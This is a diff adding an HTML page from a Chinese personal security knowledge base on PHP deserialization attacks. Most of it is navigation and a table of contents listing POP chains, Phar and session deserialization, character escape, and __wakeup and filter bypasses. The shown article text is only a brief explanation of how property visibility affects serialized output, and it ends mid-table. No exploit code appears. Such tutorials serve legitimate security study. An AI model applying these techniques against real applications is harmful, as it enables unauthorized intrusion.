@@ -1,0 +1,1962 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="F1rstb100d个人知识库，努力做一个全栈H4cker">
+      
+      
+        <meta name="author" content="F1rstb100d">
+      
+      
+        <link rel="canonical" href="https://f1rstb100d.github.io/Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+      
+      <link rel="icon" href="../../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>PHP反序列化 - F1rstb100d知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.472b142f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.08040f6c.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#4051b5">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#php" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="F1rstb100d知识库" class="md-header__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            F1rstb100d知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PHP反序列化
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../.." class="md-tabs__link">
+      知识库结构
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/" class="md-tabs__link md-tabs__link--active">
+        Web安全
+      </a>
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        二进制安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-tabs__link">
+        内网安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        环境配置
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="F1rstb100d知识库" class="md-nav__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    F1rstb100d知识库
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        知识库结构
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Web安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Web安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          SQL注入
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL注入" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          SQL注入
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        sqlmap使用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        SQL注入
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          XXE
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          XXE
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE/XXE%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        XXE漏洞
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3">
+          反序列化
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="反序列化" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          反序列化
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Java反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          PHP反序列化
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        PHP反序列化
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    基础知识
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pop" class="md-nav__link">
+    POP链
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    对象注入
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php_1" class="md-nav__link">
+    PHP原生反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP原生反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#soapclient" class="md-nav__link">
+    SoapClient
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#error" class="md-nav__link">
+    Error
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pharweb276" class="md-nav__link">
+    Phar反序列化web276
+  </a>
+  
+    <nav class="md-nav" aria-label="Phar反序列化web276">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar" class="md-nav__link">
+    phar文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar_1" class="md-nav__link">
+    phar文件结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar-demo" class="md-nav__link">
+    phar demo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    漏洞利用条件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    绕过方式
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-session" class="md-nav__link">
+    php-session反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="php-session反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    session介绍
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session_1" class="md-nav__link">
+    session的存储
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php-session_1" class="md-nav__link">
+    php-session反序列化漏洞成因
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    漏洞利用
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    反序列化字符逃逸
+  </a>
+  
+    <nav class="md-nav" aria-label="反序列化字符逃逸">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web262" class="md-nav__link">
+    字符变多web262
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    字符变少
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trick" class="md-nav__link">
+    小trick
+  </a>
+  
+    <nav class="md-nav" aria-label="小trick">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php71" class="md-nav__link">
+    php7.1+反序列化对类属性不敏感
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#__wakeupcve-2016-7124" class="md-nav__link">
+    绕过__wakeup(CVE-2016-7124)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    绕过部分正则
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web265" class="md-nav__link">
+    利用引用web265
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#16" class="md-nav__link">
+    利用 16 进制绕过过滤
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unserializewakeup" class="md-nav__link">
+    同时存在unserialize和wakeup
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Python反序列化
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_4">
+          文件上传
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="文件上传" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          文件上传
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        文件上传总结
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          二进制安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="二进制安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          二进制安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        PWN入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          内网安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="内网安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-nav__link">
+        PTH传递攻击
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          环境配置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="环境配置" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          环境配置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        Git入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    基础知识
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pop" class="md-nav__link">
+    POP链
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    对象注入
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php_1" class="md-nav__link">
+    PHP原生反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP原生反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#soapclient" class="md-nav__link">
+    SoapClient
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#error" class="md-nav__link">
+    Error
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pharweb276" class="md-nav__link">
+    Phar反序列化web276
+  </a>
+  
+    <nav class="md-nav" aria-label="Phar反序列化web276">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar" class="md-nav__link">
+    phar文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar_1" class="md-nav__link">
+    phar文件结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar-demo" class="md-nav__link">
+    phar demo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    漏洞利用条件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    绕过方式
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-session" class="md-nav__link">
+    php-session反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="php-session反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    session介绍
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session_1" class="md-nav__link">
+    session的存储
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php-session_1" class="md-nav__link">
+    php-session反序列化漏洞成因
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    漏洞利用
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    反序列化字符逃逸
+  </a>
+  
+    <nav class="md-nav" aria-label="反序列化字符逃逸">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web262" class="md-nav__link">
+    字符变多web262
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    字符变少
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trick" class="md-nav__link">
+    小trick
+  </a>
+  
+    <nav class="md-nav" aria-label="小trick">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php71" class="md-nav__link">
+    php7.1+反序列化对类属性不敏感
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#__wakeupcve-2016-7124" class="md-nav__link">
+    绕过__wakeup(CVE-2016-7124)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    绕过部分正则
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web265" class="md-nav__link">
+    利用引用web265
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#16" class="md-nav__link">
+    利用 16 进制绕过过滤
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unserializewakeup" class="md-nav__link">
+    同时存在unserialize和wakeup
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/f1rstb100d/f1rstb100d.github.io/edit/master/docs/Web安全/反序列化/PHP反序列化.md" title="编辑此页" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="php">PHP反序列化<a class="headerlink" href="#php" title="Permanent link">&para;</a></h1>
+<h2 id="_1">基础知识<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同</p>
+<div class="highlight"><pre><span></span><code><span class="x">public       被序列化的时候变量名不会更改</span>
+<span class="x">protected    被序列化的时候在变量名前加上\x00*\x00</span>
+<span class="x">private      被序列化的时候在变量名前加上\x00类名\x00</span>
+</code></pre></div>
+<p><strong>访问修饰符</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Public</th>
+<th>Protected</th>
